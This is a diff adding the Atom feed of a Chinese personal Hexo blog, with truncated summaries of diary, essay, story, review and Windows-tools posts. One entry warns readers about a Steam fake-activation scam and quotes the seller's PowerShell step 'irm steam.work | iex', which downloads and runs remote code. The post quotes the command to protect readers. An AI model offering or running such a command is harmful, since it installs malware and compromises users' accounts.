@@ -1,0 +1,299 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>呓语梦轩</title>
+  <icon>http://blog.awaae001.top/Rss.webp</icon>
+  
+  <link href="http://blog.awaae001.top/atom.xml" rel="self"/>
+  
+  <link href="http://blog.awaae001.top/"/>
+  <updated>2024-10-19T15:50:46.642Z</updated>
+  <id>http://blog.awaae001.top/</id>
+  
+  <author>
+    <name>awaae(player8635)</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【破事水】-对于未来的前瞻于回望</title>
+    <link href="http://blog.awaae001.top/posts/39440.html"/>
+    <id>http://blog.awaae001.top/posts/39440.html</id>
+    <published>2024-09-17T07:26:01.000Z</published>
+    <updated>2024-10-19T15:50:46.642Z</updated>
+    
+    
+      
+      
+        
+        
+    <summary type="html">&lt;p&gt;大伙好啊！&lt;/p&gt;
+&lt;p&gt;最近过得怎么样啊？&lt;/p&gt;
+&lt;p&gt;这里向各位说一声：&lt;strong&gt;中秋快乐哦！😄&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;最近上高三，学业压力有点大。诶，主要我为了我的未来发愁哦。现在那里都不景气，高考越来越难，&lt;strong&gt;未来一片灰暗&lt;/strong&gt;。学校也不给放假，各种各样的补课。（平时如果有什么申请或者有什么想说的，可以在留言板说，我看得见的）没法登上邮箱，烦死了！！！每天的娱乐就是班里同学在课件拿平台刷抖音。&lt;/p&gt;
+&lt;h2 id=&quot;生活&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#生活&quot;&gt;¶&lt;/a&gt;生活&lt;/h2&gt;
+&lt;p&gt;学校举行了&lt;strong&gt;教师节快闪活动&lt;/strong&gt;，后面的活动估计就只剩下的学校的&lt;strong&gt;运动会&lt;/strong&gt;力😭！&lt;/p&gt;
+&lt;h2 id=&quot;博客&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#博客&quot;&gt;¶&lt;/a&gt;博客&lt;/h2&gt;
+&lt;p&gt;没有时间写了，目前最低限度是保持博客的运行，更新速度肯定没有去年同时间段多，&lt;s&gt;没有直接跑路就好算仁至义尽，不要要求这么多好不好，我明明可以直接拉闸的&lt;/s&gt;。当然，你们的评论我&lt;strong&gt;也会去看&lt;/strong&gt;，你们发新的东西我&lt;strong&gt;也会去鉴赏&lt;/strong&gt;的（被老师抓到玩平台前）&lt;/p&gt;
+&lt;p&gt;也希望各位可以等，等到我考完高考。&lt;s&gt;（说不定还要读高四）&lt;/s&gt;&lt;/p&gt;
+&lt;p&gt;至于内容的存稿，目前有一部分的的草稿在草稿箱，虽然都是半成品，但是稍微收个尾后就可以上传&lt;/p&gt;
+&lt;h2 id=&quot;计划&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#计划&quot;&gt;¶&lt;/a&gt;计划&lt;/h2&gt;
+&lt;p&gt;来点计划吧&lt;/p&gt;
+&lt;p&gt;先是把主页修一修，然后看看什么时候&lt;strong&gt;逃离 HEXO&lt;/strong&gt; 这些都放上日程，接下来是等&lt;a href=&quot;https://store.steampowered.com/app/2421410/&quot;&gt;《全网公敌2：新世界》&lt;/a&gt;更新完成，再水一篇有关于个人隐私保护的文章，游戏库里面的：&lt;a</summary>
+        
+      
+    
+    
+    
+    
+    <category term="日常" scheme="http://blog.awaae001.top/tags/%E6%97%A5%E5%B8%B8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows工具-让你的Windows锦上添花，添了又添</title>
+    <link href="http://blog.awaae001.top/posts/44173.html"/>
+    <id>http://blog.awaae001.top/posts/44173.html</id>
+    <published>2024-09-01T03:24:47.000Z</published>
+    <updated>2024-10-19T15:50:46.646Z</updated>
+    
+    
+      
+      
+        
+        
+    <summary type="html">&lt;p&gt;微软的 Windows 系统在市场上占了相当大的份额，同样，这个系统也因为其超高的&lt;strong&gt;兼容性&lt;/strong&gt;和那&lt;strong&gt;堆成屎一样&lt;/strong&gt;的代码而闻名于世（&lt;s&gt;虽然我写的也好不到哪里去就对了&lt;/s&gt;），各种远古版本的特性到现在都没修，其美名曰是为了兼容性，但看起来应该是&lt;strong&gt;技术债&lt;/strong&gt;（谁没有啊，我现在就看不懂以前写的朋友圈逻辑了）&lt;/p&gt;
+&lt;p&gt;自然，也会有许多开发者为 &lt;em&gt;M$&lt;/em&gt; 擦屁股。&lt;/p&gt;
+&lt;p&gt;这些软件有很多类型：优化系统、添加功能、修复 bug&lt;/p&gt;
+&lt;h2 id=&quot;前言&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#前言&quot;&gt;¶&lt;/a&gt;前言&lt;/h2&gt;
+&lt;p&gt;作为一位 Windows 用户，我对于 Windows 社区内部对于 Windows 系统魔改的软件持支持态度。这些软件可以优化 Windows 的使用体验，或者为 Windows 添加更加绚丽的 UI 或者桌面背景（&lt;a href=&quot;https://www.bing.com/search?q=wallpaper+engine&quot;&gt;wallpaper engine&lt;/a&gt;），更好的垃圾处理工具（&lt;a href=&quot;https://www.ccleaner.com/&quot;&gt;C-cleaner&lt;/a&gt;），还有在系统支持周期结束后依旧在对系统提供维护的&lt;a href=&quot;https://0patch.com/&quot;&gt;0patch&lt;/a&gt;（0patch！打钱！）&lt;/p&gt;
+&lt;p&gt;在开始以前，先猜猜我的电脑系统是&lt;code&gt;WIN几&lt;/code&gt;?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://pic.awaae001.top/%E8%97%8F%E7%BB%8F%E9%98%81/24/01(win-tools)/%E7%88%B7%E7%9A%84%E6%A1%8C%E9%9D%A2%E6%88%AA%E5%9B%BE_f33287cc.webp&quot; alt=&quot;爷的桌面截图&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;这应该不是很难，但我的桌面像是&lt;code&gt;win7&lt;/code&gt;和&lt;code&gt;win10&lt;/code&gt;喝多了的产物，中间还夹杂着&lt;code&gt;win11&lt;/code&gt;带来的更新（应该是更新吧）。坏事了，我好像说出来了，那就不管了，这就是&lt;strong&gt;windows</summary>
+        
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>【短文】-彼时故城皆繁华</title>
+    <link href="http://blog.awaae001.top/posts/2042429.html"/>
+    <id>http://blog.awaae001.top/posts/2042429.html</id>
+    <published>2024-08-04T07:07:58.000Z</published>
+    <updated>2024-10-19T15:50:46.646Z</updated>
+    
+    
+      
+      
+        
+        
+    <summary type="html">&lt;p&gt;一个小孩的啼哭声悄然响起&lt;/p&gt;
+&lt;p&gt;他坐在地上，身上的衣服破破烂烂，就好似刚刚从火中走了出来，眼神中满是迷茫，他似乎要寻找些什么，但四野望去，周遭无声，只有飞舞的苍蝇、残缺的楼房、闪着火光的楼台，以及…………&lt;/p&gt;
+&lt;p&gt;漫山遍野的尸骸。&lt;/p&gt;
+&lt;p&gt;那坐在废墟之上的孩童，放声的哭着。&lt;/p&gt;
+&lt;p&gt;那楼台上人的鲜血，无声的流着。&lt;/p&gt;
+&lt;p&gt;一把沾着血的长命锁捆在断臂之上。无头的母亲抱着怀内已然断气的孩子倚靠在墙角。一位父亲被砍掉了双腿，但手里依然紧紧攥着给家里生病孩子的药包，殊不知，他那一位孩子已然死于非命。&lt;/p&gt;
+&lt;p&gt;城池无声的燃烧着。&lt;/p&gt;
+&lt;p&gt;生命无声的诉说着。&lt;/p&gt;
+&lt;p&gt;插在破楼上的旗子被燃烧的只剩下一半，上面依稀有一个酒字。&lt;/p&gt;
+&lt;p&gt;这里曾是一座繁华的古城，这里曾经有无数游人熙熙攘攘，这里曾经是无数人纸醉金迷过的地方，这里曾经是无数人魂牵梦绕的地方，这里曾经是……&lt;/p&gt;
+&lt;p&gt;而现在&lt;/p&gt;
+&lt;p&gt;一片焦土，几座废墟&lt;/p&gt;
+&lt;p&gt;到头来，所谓繁华。不过化成了几缕飞灰，几捧焦土罢了。&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs&quot;&gt;彼时故城皆繁华 攘往熙来过酒家&lt;br&gt;车马纵横卷罗帕 残阳染云霞&lt;br&gt;&lt;br&gt;何曾想敌军如风沙</summary>
+        
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>一枝红信出墙来-steam假激活入库</title>
+    <link href="http://blog.awaae001.top/posts/38498.html"/>
+    <id>http://blog.awaae001.top/posts/38498.html</id>
+    <published>2024-07-31T06:49:18.000Z</published>
+    <updated>2024-10-19T15:50:46.646Z</updated>
+    
+    
+      
+      
+        
+        
+    <summary type="html">&lt;h2 id=&quot;免责声明&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#免责声明&quot;&gt;¶&lt;/a&gt;免责声明&lt;/h2&gt;
+&lt;p&gt;本文为转载文，不代表站长态度&lt;/p&gt;
+&lt;p&gt;本文一被原作者授权转载&lt;/p&gt;
+&lt;h2 id=&quot;正文&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#正文&quot;&gt;¶&lt;/a&gt;正文&lt;/h2&gt;
+&lt;h3 id=&quot;红信&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#红信&quot;&gt;¶&lt;/a&gt;红信&lt;/h3&gt;
+&lt;p&gt;很多玩家启动Steam后收到红信时都会感觉到一头雾水，实际上，红信是Steam官方对一些违反了用户协议的玩家所采取的一种警告手段，在玩家登录Steam客户端时就会查看到红信提示&lt;/p&gt;
+&lt;p&gt;1、Steam市场巡查机制，红锁&lt;/p&gt;
+&lt;p&gt;2、卖家举报，红锁&lt;/p&gt;
+&lt;p&gt;3、V社的肃清行动，红锁、&lt;/p&gt;
+&lt;p&gt;总之：steam使用会受到限制&lt;/p&gt;
+&lt;h3 id=&quot;清单入库&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#清单入库&quot;&gt;¶&lt;/a&gt;清单入库&lt;/h3&gt;
+&lt;p&gt;结论放在前面：如果买 cdkey 买到让你要输入某个脚本再激活的，那别去管他，立刻退货并举报商家！原因就直接贴我写这个就行…&lt;/p&gt;
+&lt;p&gt;该商家在使用 Steam 注入病毒假入库来进行诈骗，证据：&lt;a href=&quot;https://www.52pojie.cn/thread-1949495-1-1.html&quot;&gt;https://www.52pojie.cn/thread-1949495-1-1.html&lt;/a&gt; （本文的来源） 请立即退款，我将会向消费者协会说明本店情况！&lt;/p&gt;
+&lt;p&gt;该楼楼主打算买一个CDK送给他的朋友，结果一看发货介绍感觉有点不对劲：&lt;/p&gt;
+&lt;figure class=&quot;highlight txt&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs txt&quot;&gt;[激活成功后不支持退款]&lt;br&gt;步骤1：按住键盘Win+X，找到powershell(终端管理员)(A)&lt;br&gt;步骤2：输入irm steam.work | iex</summary>
+        
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>飞跃13号房-对网瘾治疗披露与反抗</title>
+    <link href="http://blog.awaae001.top/posts/6884.html"/>
+    <id>http://blog.awaae001.top/posts/6884.html</id>
+    <published>2024-07-29T08:24:54.000Z</published>
+    <updated>2024-10-19T15:50:46.646Z</updated>
+    
+    
+      
+      
+        
+        
+    <summary type="html">&lt;p&gt;这里是大标题&lt;/p&gt;
+&lt;p&gt;本文花费了2天的时间，希望你可以看完！&lt;/p&gt;
+&lt;h2 id=&quot;导入&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#导入&quot;&gt;¶&lt;/a&gt;导入&lt;/h2&gt;
+&lt;p&gt;谈起&lt;strong&gt;电&lt;/strong&gt;，我们一般会想起什么？&lt;/p&gt;
+&lt;p&gt;是那些要电力才能驱动的设备：电脑、服务器、洗衣机、空调；还是那些和电有关的电气单位：电压V、电流A、电阻Ω；亦或是那些由电衍生出来的关键词：静电、电量、磁暴步兵、雷电法王、雷公、电母。无可否认，电在我们的生活中扮演着相当重要的地位，从平时照明的&lt;strong&gt;电灯&lt;/strong&gt;到运行着世界上最先进的人工智能的&lt;strong&gt;计算集群&lt;/strong&gt;，&lt;strong&gt;无处不有&lt;/strong&gt;电的身影，连这篇博文码出来的电脑也是靠电驱动的（&lt;s&gt;废话！&lt;/s&gt;）&lt;/p&gt;
+&lt;p&gt;电力由来已久，而经由电力和信息时代迎来的&lt;a href=&quot;https://www.bing.com/search?q=%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BF%A1%E6%81%AF%E9%9D%A9%E5%91%BD&quot;&gt;第三次信息革命（数字化革命）&lt;/a&gt;却在后面姗姗来迟。它兴起在20世纪50-70年代的美苏冷战时期，随着经济发展，电力和互联网也渐渐步入千家万户，从第一篇电子邮件，到第一条实时信息。从1973年4月3日第一通从波士顿到纽约的&lt;strong&gt;电话&lt;/strong&gt;，再到现在&lt;a</summary>
+        
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>时代造青年，还是青年造时代？</title>
+    <link href="http://blog.awaae001.top/posts/908575.html"/>
+    <id>http://blog.awaae001.top/posts/908575.html</id>
+    <published>2024-07-07T07:31:45.000Z</published>
+    <updated>2024-10-19T15:50:46.646Z</updated>
+    
+    
+      
+      
+        
+        
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;本文仅代表本人个人观点。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&quot;青年与时代&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#青年与时代&quot;&gt;¶&lt;/a&gt;青年与时代&lt;/h2&gt;
+&lt;p&gt;究竟是时代造就青年，还是青年造就时代？&lt;/p&gt;
+&lt;p&gt;时代，是一段时期内&lt;strong&gt;经济、政治、文化、对外关系&lt;/strong&gt;的一个复合体，而青年缺没有过多的界定，这似乎非常抽象，也对我们继续讨论这个话题带来了些许考验。也许，这就是我们学校选择这个论点作为我校辩论赛主题的原因。&lt;/p&gt;
+&lt;p&gt;时代于青年几乎是相辅相成的，在没有时代的帮助下，那些&lt;strong&gt;似乎&lt;/strong&gt;很难成就一副大事业，而我们历史上诸多的英雄豪杰也是于乱世的机遇中崛起，也有无数怀有救国济世思想的文人在这所谓的机遇中一蹶不振，甚至到头来都殒命于乱世的刀光剑影之下。&lt;/p&gt;
+&lt;p&gt;王朝崩溃，大厦将倾。而在那些大厦辉煌的前半生中，又无数文人骚客汇聚在王朝的纸醉金迷当中，难以自拔。&lt;/p&gt;
+&lt;p&gt;其实青年于时代本身就是一个对立统一的&lt;strong&gt;整体&lt;/strong&gt;，何谈时代造就青年还是青年造就时代？&lt;/p&gt;
+&lt;p&gt;一个时代，需要无数青年为之奋斗，没有一个人高喊： &lt;em&gt;“王侯将相宁有种乎？”&lt;/em&gt; 的大泽乡起义还是原来的样子吗？没有那些青年的五四运动真的还能组织起来吗？抗美援朝时期那些青年若是没有一个人敢踏上前去，保家卫国，那么…………？&lt;/p&gt;
+&lt;p&gt;青年造就时代确实有点扯，而时代造就青年也有点道理，我们都是在时代的浪潮下裹挟的一条小鱼，不是什么庞然大物，自然无法与一个时代的历史潮流抗衡。但是，假如是时代要造就的那群人群反抗时代，那结果就是：&lt;/p&gt;
+&lt;ul class=&quot;lvl-0&quot;&gt;
+&lt;li class=&quot;lvl-2&quot;&gt;
+&lt;p&gt;五四运动&lt;/p&gt;
+&lt;/li&gt;
+&lt;li class=&quot;lvl-2&quot;&gt;
+&lt;p&gt;辛亥革命&lt;/p&gt;
+&lt;/li&gt;
+&lt;li class=&quot;lvl-2&quot;&gt;
+&lt;p&gt;太平天国运动&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;诚然，个体的力量是有限的，但群体的力量是无限的，一个人无法带来&lt;strong&gt;改革开放&lt;/strong&gt;，一个人无法带来&lt;a</summary>
+        
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>hexo + github-action持续集成</title>
+    <link href="http://blog.awaae001.top/posts/26785.html"/>
+    <id>http://blog.awaae001.top/posts/26785.html</id>
+    <published>2024-06-07T09:18:30.000Z</published>
+    <updated>2024-10-19T15:50:46.646Z</updated>
+    
+    
+    <summary type="html">介绍了如何创建一个基于ssh-key的github-action工作流来进行持续集成，可以让hexo变得领包即走，非常方便，它也解放了我们的双手，让我们可以在本地编写完毕后直接上传到github，让github为我们分发和部署我们的项目</summary>
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>友链区JavaScript组件-重做版</title>
+    <link href="http://blog.awaae001.top/posts/52004.html"/>
+    <id>http://blog.awaae001.top/posts/52004.html</id>
+    <published>2024-06-02T06:53:28.000Z</published>
+    <updated>2024-10-19T15:50:46.646Z</updated>
+    
+    
+    <summary type="html">我没的主题没有自带的友链区，这就需要我们使用如上面那位的样子来使用表格，这样子很烦，而且非常不好看，所以就有了这个东西,下面这段代码有一个大前提,确保你的主题支持html代码内嵌。</summary>
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>一周年-忽而回望，不知光阴几何</title>
+    <link href="http://blog.awaae001.top/posts/56520.html"/>
+    <id>http://blog.awaae001.top/posts/56520.html</id>
+    <published>2024-05-26T07:38:53.000Z</published>
+    <updated>2024-10-19T15:50:46.646Z</updated>
+    
+    
+    <summary type="html">这是呓语梦轩一周年的总结性文本，详细介绍了呓语梦轩这一年说经历了什么，又远望未来</summary>
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>饿殍：明末千里行-岁大饥，人相食</title>
+    <link href="http://blog.awaae001.top/posts/23024.html"/>
+    <id>http://blog.awaae001.top/posts/23024.html</id>
+    <published>2024-05-05T06:10:21.000Z</published>
+    <updated>2024-10-19T15:50:46.646Z</updated>
+    
+    
+      
+      
+        
+        
+    <summary type="html">&lt;h2 id=&quot;注意：&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#注意：&quot;&gt;¶&lt;/a&gt;注意：&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;b&gt;注意：本文含有剧透内容，请谨慎阅读！！！&lt;/br&gt;注意：本文含有剧透内容，请谨慎阅读！！！&lt;/br&gt;注意：本文含有剧透内容，请谨慎阅读！！！&lt;/b&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;游戏读音：饿殍（piao-2）：明末千里行&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&quot;正文&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#正文&quot;&gt;¶&lt;/a&gt;正文&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;“岁大饥，人相食。” —— 《明史 卷二三三 列传第一二一》&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;明末，天降大旱，民不聊生，故事就是在这个时候发生的，它作为中国国风Galgame作品，摒弃了许多同行作品中的虚幻背景、架空世界，而转而从时代背景出发，向我们讲述的一个名为：“&lt;strong&gt;救赎&lt;/strong&gt;” 的故事。&lt;/p&gt;
+&lt;center&gt;
+&lt;iframe</summary>
+        
+      
+    
+    
+    
+    
+  </entry>
+  
+</feed>
